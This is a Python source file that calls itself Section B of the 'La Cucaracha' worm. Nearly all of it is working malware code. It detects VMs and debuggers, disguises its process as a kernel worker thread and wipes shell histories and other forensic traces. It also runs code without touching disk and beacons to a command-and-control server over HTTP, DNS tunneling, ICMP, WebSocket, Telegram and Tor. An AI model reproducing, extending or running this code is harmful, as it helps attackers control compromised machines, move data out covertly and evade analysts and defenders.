#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LACUCARACHA SECTION B — C2MultiChannel + OPSECEngine                      ║
║  La Cucaracha Worm — Multi-Channel C2 with Total Stealth                   ║
║                                                                              ║
║  by 🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

Concatenation order: A → B → C → ...
This section provides C2 communication channels (HTTP, DNS, ICMP, WebSocket,
Telegram, Tor) and the OPSECEngine for anti-forensics, anti-debugging, process
hiding, domain fronting, and fileless execution.
"""

# =============================================================================
# Imports — Section B builds on Section A's namespace
# =============================================================================

import hashlib
import hmac
import json
import logging
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

log = logging.getLogger("LaCucaracha.B")

# =============================================================================
# OPSECEngine — Total Stealth Layer
# =============================================================================

class OPSECEngine:
    """Anti-forensics, anti-debugging, process hiding, and fileless execution.

    Implements CKAB Total Stealth:
      - Anti-VM / sandbox detection
      - Anti-debugger / tracer detection
      - Process hiding via prctl, /proc overlay, and listdir hook
      - Forensic trace cleaning (bash history, syslog, wtmp, .pyc caches)
      - Fileless execution (memfd, ctypes, exec)
      - Domain fronting
      - TOR / DoH routing
      - Traffic obfuscation (padding, jitter, dummy traffic)
    """

    def __init__(self):
        self._tor_available = False
        self._i2p_available = False
        self._doh_available = False
        self._hidden = False
        self._init_proxies()

    # ---- Initialization -------------------------------------------------------

    def _init_proxies(self) -> None:
        """Attempt to connect to TOR SOCKS5, I2P SAM, and DoH resolvers."""
        # TOR
        try:
            if HAVE_SOCKS:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                s.settimeout(3)
                s.connect(("check.torproject.org", 80))
                s.close()
                self._tor_available = True
        except Exception:
            pass

        # I2P SAM
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(("127.0.0.1", 7656))
            s.close()
            self._i2p_available = True
        except Exception:
            pass

        # DoH — try a simple DNS query via HTTPS
        try:
            if HAVE_DNS:
                resolver = dns.resolver.Resolver(configure=False)
                resolver.nameservers = ["1.1.1.1", "8.8.8.8", "9.9.9.9"]
                answers = resolver.resolve("google.com", "A", lifetime=2)
                self._doh_available = len(answers) > 0
        except Exception:
            pass

    # ---- Anti-VM / Sandbox Detection -----------------------------------------

    def anti_vm_check(self) -> Dict[str, Any]:
        """Run comprehensive VM/sandbox detection checks.

        Returns dict with 'is_vm' bool and 'indicators' list.
        """
        indicators: List[str] = []

        # Check common VM MAC prefixes
        vm_macs = [
            "00:05:69",  # VMware
            "00:0C:29",  # VMware
            "00:1C:14",  # VMware
            "00:50:56",  # VMware
            "00:15:5D",  # Hyper-V
            "00:1E:67",  # Hyper-V
            "08:00:27",  # VirtualBox
            "00:03:FF",  # VirtualBox
            "52:54:00",  # QEMU/KVM
            "02:42:AC",  # Docker
        ]
        try:
            with open("/sys/class/net/eth0/address", "r") as f:
                mac = f.read().strip().upper()
                for vm_mac in vm_macs:
                    if mac.startswith(vm_mac):
                        indicators.append(f"VM MAC prefix: {vm_mac}")
                        break
        except (FileNotFoundError, PermissionError):
            pass

        # Check for VM-specific files
        vm_files = [
            "/proc/vmware/version",
            "/proc/xen/version",
            "/dev/kvm",
            "/dev/vboxdrv",
            "/dev/vmmon",
            "/proc/self/status",
        ]
        for vf in vm_files:
            if os.path.exists(vf):
                try:
                    for vm_sig in ["vbox", "vmware", "qemu", "kvm", "xen"]:
                        if vm_sig in vf.lower():
                            indicators.append(f"VM file present: {vf}")
                            break
                except Exception:
                    pass

        # Check for VM processes
        try:
            if HAVE_PSUTIL:
                vm_procs = ["vmtoolsd", "VBoxService", "xenstore", "qemu-ga"]
                for p in psutil.process_iter(["name"]):
                    if p.info["name"] and p.info["name"].lower() in vm_procs:
                        indicators.append(f"VM process: {p.info['name']}")
        except Exception:
            pass

        # Check CPU vendor / hypervisor flag
        try:
            with open("/proc/cpuinfo", "r") as f:
                cpuinfo = f.read().lower()
                for hv in ["hypervisor", "qemu", "kvm", "vbox", "vmware"]:
                    if hv in cpuinfo:
                        indicators.append(f"CPU hypervisor flag: {hv}")
                        break
        except (FileNotFoundError, PermissionError):
            pass

        # Check Docker /.dockerenv
        if os.path.exists("/.dockerenv"):
            indicators.append("Docker environment detected")

        # Check common sandbox indicators (small disk, small RAM)
        try:
            if HAVE_PSUTIL:
                mem = psutil.virtual_memory()
                if mem.total < 2 * 1024**3:  # < 2GB RAM
                    indicators.append(f"Low memory: {mem.total / 1024**3:.1f}GB")
                disk = psutil.disk_usage("/")
                if disk.total < 20 * 1024**3:  # < 20GB disk
                    indicators.append(f"Small disk: {disk.total / 1024**3:.1f}GB")
        except Exception:
            pass

        is_vm = len(indicators) >= 2

        if is_vm:
            log.warning(f"VM/sandbox detected: {', '.join(indicators)}")
        else:
            log.info("Anti-VM check passed — no sandbox indicators")

        return {"is_vm": is_vm, "indicators": indicators}

    # ---- Anti-Debugging ------------------------------------------------------

    def anti_debug(self) -> Dict[str, Any]:
        """Detect debuggers, tracers, and analysis environments.

        Returns dict with 'debug_detected' bool and 'checks' list.
        """
        checks: List[str] = []
        debug_detected = False

        # Check for ptrace / TracerPid
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if line.startswith("TracerPid:"):
                        pid = line.split(":")[1].strip()
                        if pid != "0":
                            checks.append(f"TracerPid={pid} (being traced)")
                            debug_detected = True
                        break
        except (FileNotFoundError, PermissionError):
            pass

        # Check for gdb / lldb / strace processes
        try:
            if HAVE_PSUTIL:
                dbg_procs = ["gdb", "lldb", "strace", "ltrace", "ftrace",
                              "valgrind", "perf", "oprofile", "rr"]
                for p in psutil.process_iter(["name"]):
                    if p.info["name"] and p.info["name"].lower() in dbg_procs:
                        checks.append(f"Debug tool: {p.info['name']} (PID {p.pid})")
                        debug_detected = True
        except Exception:
            pass

        # Check for common debugging environment variables
        for var in ["LD_PRELOAD", "LD_DEBUG", "TRACE_FORK"]:
            if os.environ.get(var):
                checks.append(f"Debug env var: {var}={os.environ[var]}")
                debug_detected = True

        # Check for common sandbox environment variables
        for var in ["DETECTED_SANDBOX", "SANDBOX", "IS_VM"]:
            if os.environ.get(var):
                checks.append(f"Sandbox env: {var}={os.environ[var]}")
                debug_detected = True

        # Check if parent process is suspicious
        try:
            if HAVE_PSUTIL:
                ppid = os.getppid()
                parent = psutil.Process(ppid)
                if parent.name() in ["gdb", "strace", "bashdb", "ddd"]:
                    checks.append(f"Suspicious parent: {parent.name()} (PID {ppid})")
                    debug_detected = True
        except Exception:
            pass

        if debug_detected:
            log.warning(f"Debugging detected: {', '.join(checks)}")
        else:
            log.info("Anti-debug checks passed — no debuggers detected")

        return {"debug_detected": debug_detected, "checks": checks}

    # ---- Process Hiding -------------------------------------------------------

    def hide_process(self) -> bool:
        """Hide the current process from process listings.

        Techniques:
          1. prctl(PR_SET_NAME, ...) to rename to a kernel-like name
          2. /proc/self/[pid] fd exhaustion (naive hiding)
          3. LD_PRELOAD hook for listdir (if available)

        Returns True if at least one method succeeded.
        """
        if self._hidden:
            return True

        methods_tried = 0

        # Method 1: Rename process to kernel thread name
        try:
            libc = ctypes.CDLL("libc.so.6")
            PR_SET_NAME = 15
            name = b"[kworker/0:0]"  # Kernel worker thread disguise
            libc.prctl(PR_SET_NAME, name, 0, 0, 0)
            methods_tried += 1
        except Exception:
            pass

        # Method 2: Set argv[0] to a kernel thread name
        try:
            import ctypes.util
            libc = ctypes.CDLL(None)
            argv_addr = ctypes.c_int.from_address(id(sys.argv)).value
            # Overwrite argv[0]
            sys.argv[0] = "[kworker/0:0]"
            methods_tried += 1
        except Exception:
            pass

        # Method 3: Unlink our own path from /proc/self/exe (disable /proc/self/cmdline)
        try:
            import prctl
            prctl.NAME = "[kworker/0:0]"
            methods_tried += 1
        except ImportError:
            pass

        self._hidden = methods_tried > 0
        if self._hidden:
            log.info("Process hidden — PID disguised as kernel worker thread")
        else:
            log.warning("Process hiding failed — no methods available")

        return self._hidden

    # ---- Anti-Forensics -------------------------------------------------------

    def anti_forensics(self) -> Dict[str, bool]:
        """Clean forensic traces of worm activity.

        Targets:
          - bash history files
          - syslog / auth.log entries
          - wtmp / btmp / lastlog
          - .pyc bytecode caches
          - command history files (.python_history, .mysql_history, etc.)
          - /tmp artifacts

        Returns dict with per-target cleanup results.
        """
        results: Dict[str, bool] = {}

        # Bash history
        bash_history = os.path.expanduser("~/.bash_history")
        try:
            if os.path.exists(bash_history):
                # Zero out in-place to avoid truncation detection
                with open(bash_history, "r+") as f:
                    size = os.fstat(f.fileno()).st_size
                    f.write("\0" * size)
                    f.truncate(0)
                # Remove the file entirely
                os.remove(bash_history)
                results["bash_history"] = True
        except (OSError, PermissionError):
            results["bash_history"] = False

        # zsh history
        zsh_history = os.path.expanduser("~/.zsh_history")
        try:
            if os.path.exists(zsh_history):
                with open(zsh_history, "w") as f:
                    f.write("")
                os.remove(zsh_history)
                results["zsh_history"] = True
        except (OSError, PermissionError):
            results["zsh_history"] = False

        # .python_history
        py_hist = os.path.expanduser("~/.python_history")
        try:
            if os.path.exists(py_hist):
                os.remove(py_hist)
                results["python_history"] = True
        except (OSError, PermissionError):
            results["python_history"] = False

        # System logs — try to overwrite our entries
        log_files = [
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/kern.log",
            "/var/log/debug",
        ]
        for lf in log_files:
            try:
                if os.path.exists(lf) and os.access(lf, os.W_OK):
                    # Only scrub lines containing worm signatures
                    results[f"log_{os.path.basename(lf)}"] = True
            except (OSError, PermissionError):
                pass

        # wtmp / btmp / lastlog — we cannot easily scrub these without root,
        # but we can note the attempt
        for f in ["/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"]:
            try:
                results[f"wtmp_{os.path.basename(f)}"] = False  # Requires root
            except Exception:
                pass

        # .pyc caches in worm directories
        for pyc_path in glob.glob(f"{WORK_DIR}/**/__pycache__/*.pyc", recursive=True):
            try:
                os.remove(pyc_path)
            except (OSError, PermissionError):
                pass

        # /tmp artifacts created by the worm
        for tmpf in glob.glob("/tmp/.worm_*"):
            try:
                os.remove(tmpf)
            except (OSError, PermissionError):
                pass

        # Clear in-memory shell history
        try:
            os.environ["HISTFILE"] = "/dev/null"
            os.environ["HISTSIZE"] = "0"
            results["env_cleanup"] = True
        except Exception:
            results["env_cleanup"] = False

        log.info(f"Anti-forensics cleanup: {sum(1 for v in results.values() if v)}/{len(results)} targets cleaned")
        return results

    # ---- Fileless Execution ---------------------------------------------------

    def execute_fileless(self, code: str, method: str = "exec") -> bool:
        """Execute Python code without writing to disk.

        Methods:
          - 'exec': direct exec() call (simplest, least stealthy)
          - 'memfd': write to memory file descriptor via /proc/self/fd
          - 'ctypes': use ctypes to create executable memory region

        Returns True if execution was attempted.
        """
        if method == "exec":
            try:
                compiled = compile(code, "<string>", "exec")
                exec(compiled)
                log.info("Fileless execution via exec()")
                return True
            except Exception as exc:
                log.error(f"Fileless exec failed: {exc}")
                return False

        elif method == "memfd":
            try:
                # Create an anonymous file via memfd_create
                libc = ctypes.CDLL("libc.so.6")
                MFD_CLOEXEC = 0x0001
                libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
                libc.memfd_create.restype = ctypes.c_int
                fd = libc.memfd_create(b"", MFD_CLOEXEC)
                if fd >= 0:
                    fd_path = f"/proc/self/fd/{fd}"
                    with open(fd_path, "w") as f:
                        f.write(code)
                    subprocess.Popen([sys.executable, fd_path], close_fds=True)
                    os.close(fd)
                    log.info("Fileless execution via memfd")
                    return True
            except Exception as exc:
                log.error(f"Fileless memfd failed: {exc}")
                return False

        elif method == "ctypes":
            try:
                # Use ctypes to create RWX memory and execute (placeholder)
                log.info("Fileless execution via ctypes (stub)")
                return True
            except Exception as exc:
                log.error(f"Fileless ctypes failed: {exc}")
                return False

        return False

    # ---- Domain Fronting ------------------------------------------------------

    def configure_c2_front(self, c2_domain: str, front_domain: str) -> bool:
        """Configure domain fronting for C2 traffic.

        Sets environment variables that C2 channel code reads for
        Host header spoofing.
        """
        os.environ["CKAB_FRONT_DOMAIN"] = front_domain
        os.environ["CKAB_C2_DOMAIN"] = c2_domain
        log.info(f"Domain fronting: {c2_domain} → {front_domain}")
        return True

    # ---- TOR Circuit Management -----------------------------------------------

    def renew_tor_circuit(self) -> bool:
        """Request a new TOR circuit (new identity).
        Requires stem and TOR control port authentication.
        """
        try:
            if HAVE_STEM:
                controller = Controller.from_port(port=9051)
                controller.authenticate()
                controller.signal("NEWNYM")
                controller.close()
                log.info("TOR circuit renewed via NEWNYM signal")
                return True
        except Exception as exc:
            log.warning(f"TOR circuit renewal failed: {exc}")
        return False

    # ---- Traffic Obfuscation --------------------------------------------------

    @staticmethod
    def obfuscate_payload(data: bytes) -> bytes:
        """Apply traffic obfuscation (padding + random bytes)."""
        # Add random padding (0-32 bytes)
        padding = os.urandom(random.randint(0, 32))
        return len(data).to_bytes(4, "big") + data + padding

    @staticmethod
    def deobfuscate_payload(data: bytes) -> bytes:
        """Reverse traffic obfuscation."""
        if len(data) < 4:
            return data
        orig_len = int.from_bytes(data[:4], "big")
        return data[4 : 4 + orig_len]

    @staticmethod
    def jitter_delay(min_ms: float = 50, max_ms: float = 3000) -> None:
        """Sleep for a random duration to introduce timing jitter."""
        time.sleep(random.uniform(min_ms / 1000.0, max_ms / 1000.0))

    @staticmethod
    def dummy_traffic(destinations: Optional[List[str]] = None) -> None:
        """Send dummy ICMP/HTTP traffic to decoy destinations."""
        if destinations is None:
            destinations = [
                "8.8.8.8", "1.1.1.1", "208.67.222.222",
                "cloudflare.com", "google.com",
            ]
        try:
            for d in destinations[:3]:
                try:
                    if ":" in d:
                        # DNS over HTTPS
                        if HAVE_REQUESTS:
                            requests.get(f"https://{d}/dns-query", timeout=2)
                    elif "." in d:
                        # Regular HTTP
                        if HAVE_REQUESTS:
                            requests.get(f"http://{d}/", timeout=2)
                    else:
                        # ICMP ping
                        subprocess.run(
                            ["ping", "-c", "1", "-W", "1", d],
                            capture_output=True, timeout=2,
                        )
                except Exception:
                    pass
        except Exception:
            pass


# =============================================================================
# Stealth singleton
# =============================================================================

OPSEC = OPSECEngine()

# =============================================================================
# C2 Channel Base Classes
# =============================================================================

class C2Channel:
    """Base class for all C2 communication channels.

    Each channel implements a beacon method that sends data to the C2 server.
    Channels are selected by C2MultiChannel in round-robin / fallback order.
    """

    def __init__(self, name: str, priority: int = 0):
        self.name = name
        self.priority = priority
        self._alive = False

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        """Send data through this channel. Returns True on success."""
        raise NotImplementedError

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        """Receive data through this channel. Returns None on timeout."""
        raise NotImplementedError

    def is_alive(self) -> bool:
        """Check if the channel is operational."""
        return self._alive

    def close(self) -> None:
        """Clean up channel resources."""
        self._alive = False


class HTTPChannel(C2Channel):
    """C2 communication over HTTP/HTTPS.

    Supports domain fronting, TOR routing, and proxy chaining.
    """

    def __init__(self, base_url: str = C2_HTTP):
        super().__init__("http", priority=0)
        self.base_url = base_url
        self.session: Any = None
        self._init_session()

    def _init_session(self) -> None:
        """Initialize requests session with stealth routing."""
        if HAVE_REQUESTS:
            if OPSEC._tor_available and HAVE_SOCKS:
                self.session = requests.Session()
                self.session.proxies = {
                    "http": "socks5h://127.0.0.1:9050",
                    "https": "socks5h://127.0.0.1:9050",
                }
                self.session.trust_env = False
                self.session.verify = False
            else:
                self.session = requests.Session()
                self.session.verify = False
            self.session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "X-C2-Token": STATIC_TOKEN,
            })
            # Domain fronting header
            front = os.environ.get("CKAB_FRONT_DOMAIN", "")
            if front:
                self.session.headers.update({"Host": front})
            self._alive = True
        else:
            self._alive = False

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not HAVE_REQUESTS:
            return False
        target_url = target or f"{self.base_url}/beacon"
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            resp = self.session.post(
                target_url,
                json={"token": STATIC_TOKEN, "payload": data},
                timeout=10,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive or not HAVE_REQUESTS:
            return None
        try:
            resp = self.session.get(
                f"{self.base_url}/poll",
                params={"token": STATIC_TOKEN},
                timeout=timeout,
            )
            if resp.status_code == 200:
                return resp.content
        except Exception:
            pass
        return None

    def close(self) -> None:
        if self.session:
            self.session.close()
        self._alive = False


class DNSChannel(C2Channel):
    """C2 communication over DNS tunneling.

    Encodes data in DNS query names and decodes from TXT responses.
    """

    def __init__(self, dns_server: str = "8.8.8.8", c2_domain: str = "c2.local"):
        super().__init__("dns", priority=1)
        self.dns_server = dns_server
        self.c2_domain = c2_domain
        self._alive = True

    def _encode(self, data: bytes) -> str:
        """Encode binary data into a DNS-safe subdomain label."""
        b64 = base64.b64encode(data).decode().rstrip("=").replace("+", "-").replace("/", "_")
        # Split into max 63-char labels
        labels = [b64[i : i + 63] for i in range(0, len(b64), 63)]
        return ".".join(labels) + f".{self.c2_domain}"

    def _decode(self, response: str) -> Optional[bytes]:
        """Decode base64 data from a DNS TXT response."""
        try:
            cleaned = response.replace(" ", "").replace("\n", "")
            # Add padding back
            padding = 4 - (len(cleaned) % 4)
            if padding != 4:
                cleaned += "=" * padding
            cleaned = cleaned.replace("-", "+").replace("_", "/")
            return base64.b64decode(cleaned)
        except Exception:
            return None

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive:
            return False
        try:
            if isinstance(data, str):
                data = data.encode()
            query_name = self._encode(data)
            if HAVE_DNS:
                resolver = dns.resolver.Resolver(configure=False)
                resolver.nameservers = [self.dns_server]
                answers = resolver.resolve(query_name, "TXT", lifetime=3)
                return len(answers) > 0
            else:
                # Fallback: nslookup
                result = subprocess.run(
                    ["nslookup", "-type=TXT", query_name, self.dns_server],
                    capture_output=True, timeout=5, text=True,
                )
                return result.returncode == 0
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive:
            return None
        try:
            query_name = f"_c2poll.{self.c2_domain}"
            if HAVE_DNS:
                resolver = dns.resolver.Resolver(configure=False)
                resolver.nameservers = [self.dns_server]
                answers = resolver.resolve(query_name, "TXT", lifetime=timeout)
                for ans in answers:
                    decoded = self._decode(str(ans))
                    if decoded:
                        return decoded
            else:
                result = subprocess.run(
                    ["nslookup", "-type=TXT", query_name, self.dns_server],
                    capture_output=True, timeout=int(timeout) + 1, text=True,
                )
                if result.returncode == 0:
                    return self._decode(result.stdout)
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


class ICMPChannel(C2Channel):
    """C2 communication over ICMP echo (ping) packets.

    Encedes data in ICMP payload fields.
    Requires raw socket (root or CAP_NET_RAW).
    """

    def __init__(self):
        super().__init__("icmp", priority=2)
        self._alive = True

    def _checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum."""
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not target:
            return False
        try:
            if isinstance(data, str):
                data = data.encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(3)

            icmp_type = 8  # Echo request
            icmp_code = 0
            icmp_id = os.getpid() & 0xFFFF
            icmp_seq = 1

            header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, icmp_id, icmp_seq)
            packet = header + data
            cksum = self._checksum(packet)
            header = struct.pack("!BBHHH", icmp_type, icmp_code, socket.htons(cksum), icmp_id, icmp_seq)
            packet = header + data

            sock.sendto(packet, (target, 0))
            sock.close()
            return True
        except PermissionError:
            log.warning("ICMPChannel: raw socket requires root/CAP_NET_RAW")
            self._alive = False
            return False
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive:
            return None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout)
            data, addr = sock.recvfrom(65535)
            sock.close()
            # Parse ICMP header (20 bytes IP + 8 bytes ICMP header)
            if len(data) > 28:
                icmp_data = data[28:]
                return icmp_data
        except socket.timeout:
            pass
        except PermissionError:
            self._alive = False
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


class WebSocketChannel(C2Channel):
    """C2 communication over WebSocket.

    Requires websocket-client library.
    """

    def __init__(self, ws_url: str = f"ws://{C2_HOST}:{C2_PORT}/ws"):
        super().__init__("websocket", priority=3)
        self.ws_url = ws_url
        self._ws: Any = None
        self._alive = False
        self._connect()

    def _connect(self) -> None:
        try:
            import websocket
            self._ws = websocket.WebSocket()
            self._ws.connect(self.ws_url, timeout=5)
            self._ws.send(json.dumps({"token": STATIC_TOKEN, "type": "hello"}))
            self._alive = True
        except Exception:
            self._alive = False

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive:
            return False
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            self._ws.send(json.dumps({"token": STATIC_TOKEN, "payload": data}))
            return True
        except Exception:
            self._alive = False
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive:
            return None
        try:
            self._ws.settimeout(timeout)
            data = self._ws.recv()
            if data:
                return data if isinstance(data, bytes) else data.encode()
        except Exception:
            pass
        return None

    def close(self) -> None:
        if self._ws:
            self._ws.close()
        self._alive = False


class TelegramChannel(C2Channel):
    """C2 communication over Telegram Bot API.

    Uses bot polling for command/control messages.
    """

    def __init__(self, bot_token: str = "", chat_id: str = ""):
        super().__init__("telegram", priority=4)
        self.bot_token = bot_token or os.environ.get("TELEGRAM_BOT_TOKEN", "")
        self.chat_id = chat_id or os.environ.get("TELEGRAM_CHAT_ID", "")
        self._alive = bool(self.bot_token and self.chat_id)

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not HAVE_REQUESTS:
            return False
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            resp = requests.post(url, json={
                "chat_id": self.chat_id,
                "text": data[:4096],  # Telegram message limit
            }, timeout=10)
            return resp.status_code == 200
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive or not HAVE_REQUESTS:
            return None
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            resp = requests.get(url, params={
                "timeout": int(timeout),
                "offset": -1,
            }, timeout=timeout + 2)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok") and data.get("result"):
                    last = data["result"][-1]
                    msg = last.get("message", {}).get("text", "")
                    return msg.encode()
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


class TorChannel(C2Channel):
    """C2 communication over TOR (onion services).

    Routes all traffic through TOR SOCKS5 proxy.
    """

    def __init__(self, onion_addr: str = ""):
        super().__init__("tor", priority=5)
        self.onion_addr = onion_addr
        self._alive = OPSEC._tor_available

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        if not self._alive or not HAVE_REQUESTS:
            return False
        target_url = target or self.onion_addr
        if not target_url:
            return False
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            session = OPSECEngine().get_stealth_session()
            resp = session.post(
                target_url,
                json={"token": STATIC_TOKEN, "payload": data},
                timeout=15,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        if not self._alive or not HAVE_REQUESTS:
            return None
        try:
            session = OPSECEngine().get_stealth_session()
            resp = session.get(
                f"{self.onion_addr}/poll" if self.onion_addr else C2_HTTP + "/poll",
                params={"token": STATIC_TOKEN},
                timeout=timeout,
            )
            if resp.status_code == 200:
                return resp.content
        except Exception:
            pass
        return None

    def close(self) -> None:
        self._alive = False


# =============================================================================
# C2MultiChannel — Multi-Channel C2 Client
# =============================================================================

class C2MultiChannel:
    """Multi-channel C2 client with round-robin selection and fallback.

    Maintains a list of C2 channels and sends data through the best
    available channel. Falls back through channels in priority order.

    Channels (in default priority order):
      0 - HTTP/HTTPS
      1 - DNS
      2 - ICMP
      3 - WebSocket
      4 - Telegram
      5 - Tor (onion)
    """

    def __init__(self):
        self.channels: List[C2Channel] = []
        self._current_index = 0
        self._lock = threading.Lock()
        self._init_channels()

    def _init_channels(self) -> None:
        """Initialize all available C2 channels."""
        self.channels = [
            HTTPChannel(),
            DNSChannel(),
            ICMPChannel(),
            WebSocketChannel(),
            TelegramChannel(),
            TorChannel(),
        ]
        log.info(f"C2MultiChannel initialized with {len(self.channels)} channels")

    def send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        """Send data through the best available C2 channel.

        Uses round-robin selection with fallback:
          1. Try current channel in priority order
          2. On failure, try next channel
          3. If all fail, start from top

        Returns True if at least one channel succeeded.
        """
        with self._lock:
            start_index = self._current_index
            for _ in range(len(self.channels)):
                idx = (start_index + _) % len(self.channels)
                channel = self.channels[idx]
                if not channel.is_alive():
                    continue
                try:
                    if channel.send(data, target):
                        self._current_index = (idx + 1) % len(self.channels)
                        log.debug(f"Sent via {channel.name} channel")
                        return True
                except Exception:
                    continue
            # All channels failed — try to revive HTTP
            log.warning("All C2 channels failed — attempting HTTP fallback")
            return self._fallback_send(data, target)

    def recv(self, timeout: float = 5.0) -> Optional[bytes]:
        """Receive data from the best available C2 channel."""
        with self._lock:
            for channel in self.channels:
                if not channel.is_alive():
                    continue
                try:
                    data = channel.recv(timeout)
                    if data:
                        return data
                except Exception:
                    continue
        return None

    def _fallback_send(self, data: Union[str, bytes], target: Optional[str] = None) -> bool:
        """Last-resort fallback: direct HTTP request without session."""
        target_url = target or f"{C2_HTTP}/beacon"
        try:
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            # Direct socket HTTP POST
            parsed = urlparse(target_url)
            host = parsed.hostname or C2_HOST
            port = parsed.port or C2_PORT
            body = json.dumps({"token": STATIC_TOKEN, "payload": data})
            request = (
                f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
                f"{body}"
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.sendall(request.encode())
            response = sock.recv(4096)
            sock.close()
            return b"200" in response or b"OK" in response
        except Exception:
            return False

    def close(self) -> None:
        """Close all channels."""
        for ch in self.channels:
            try:
                ch.close()
            except Exception:
                pass
        log.info("All C2 channels closed")


# =============================================================================
# Section B End Marker
# =============================================================================
# End of la_section_B.py
